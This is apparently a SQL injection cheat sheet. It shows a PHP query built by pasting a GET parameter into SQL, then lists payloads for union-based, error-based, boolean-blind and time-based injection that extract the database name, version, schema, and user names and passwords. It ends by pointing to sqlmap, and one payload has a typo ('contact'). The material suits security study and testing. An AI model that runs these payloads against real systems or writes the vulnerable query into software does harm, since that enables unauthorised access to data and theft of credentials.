# Example

```
$id = $_GET["id"];
$db_query = "SELECT * FROM table WHERE ID='$id' LIMIT 0,1;";
```

* Union Based Injection
* Error Based Injection
* Boolean Based blind Injection
* Time Base Injection

Note: There are many comment out statement in different type and version of SQL.

for example:

* --
* #
* /*
* --+

## Check Vulnerability
```
input: 1' or '1'='1
input: 1"
input: 1'
```

# Union Based Injection
"-- -" comment out the statement after union select
```
input 1' union select 1-- -
input 1' union select 1,2-- -
input 1' union select 1,2,3-- -

# $db_query = "SELECT * FROM table WHERE ID='1' union select 1,2-- -LIMIT 0,1;
```

```
# query database name
input -1' union select 1, database()-- -
# query sql version
input -1' union select 1, version()-- -
# query db user
input -1' union select 1, user()-- -
# query tables list
input -1' union select 1,table_name from information_schema.tables where table_schema=database()--
# query "user" table's columns
input -1' union select 1,column_name from information_schema.columns where table_schema=database() and table_name='user'--+
# query "user" table's rows
input -1' union select 1, contact(ID,",",Name,",",",Pass) from user--+

# $db_query = "SELECT * FROM ID='-1' union select 1,version()-- - LIMIT 0,1;"
```

# Error based Injection

```
# query database name
input -1' and extractvalue(0x0a,concat(0x0a,(select database()))) --+
# query table name
input -1' and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))--+
```

# Boolean base blind Injection
```
# query db version
input 1' and substring(version(),1,1)=4--+
response: no response

# query db version
input 1' and substring(version(),1,1)=5--+
response: yes
then we know the db version is 5

input 1' and ascii(substring((select concat(table_name) from information_schema.tables where table_schema=database() limit 0,1), 1, 1)) > 64 --+
try >64, >112, >95, >110, =102 (narrow down)
then we know the first character of table name is "f" (ascii=102)

input 1' and ascii(substring((select concat(column_name) from information_schema.columns where table_name="fxxxx" limit 0,1), 1, 1))=73--+
response: yes
then we know the table fxxxx's first column's first character is "I" (ascii=73)
```

# Time based Injection
```
# check which comment statement is target database using 
input 1' and sleep(3)--
input 1' and sleep(3)--+
input 1' and sleep(3)#
```

# Tool

http://sqlmap.org/
